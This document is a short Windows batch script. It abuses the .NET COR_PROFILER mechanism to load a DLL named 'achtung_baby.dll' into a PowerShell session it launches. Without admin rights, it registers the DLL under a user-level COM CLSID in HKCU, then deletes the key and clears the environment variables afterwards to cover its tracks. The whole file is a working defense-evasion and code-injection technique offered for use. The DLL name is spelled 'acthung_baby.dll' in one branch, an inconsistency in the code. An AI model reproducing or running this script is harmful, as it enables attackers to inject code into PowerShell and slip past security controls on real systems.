@echo off
set COR_ENABLE_PROFILING=1
set COR_PROFILER={5c8e9579-53b9-5a69-6a75-2d232518df35}

net session >nul 2>&1
if %errorlevel% == 0 (
  set COR_PROFILER_DLL=%~dp0achtung_baby.dll
) else (
  REG ADD "HKCU\Software\Classes\CLSID\{5c8e9579-53b9-5a69-6a75-2d232518df35}" /f
  REG ADD "HKCU\Software\Classes\CLSID\{5c8e9579-53b9-5a69-6a75-2d232518df35}\InprocServer32" /f
  REG ADD "HKCU\Software\Classes\CLSID\{5c8e9579-53b9-5a69-6a75-2d232518df35}\InprocServer32" /ve /t REG_SZ /d "%~dp0acthung_baby.dll" /f
)

powershell

set COR_ENABLE_PROFILING=
set COR_PROFILER=
set COR_PROFILER_DLL=
REG DELETE "HKCU\Software\Classes\CLSID\{5c8e9579-53b9-5a69-6a75-2d232518df35}" /f
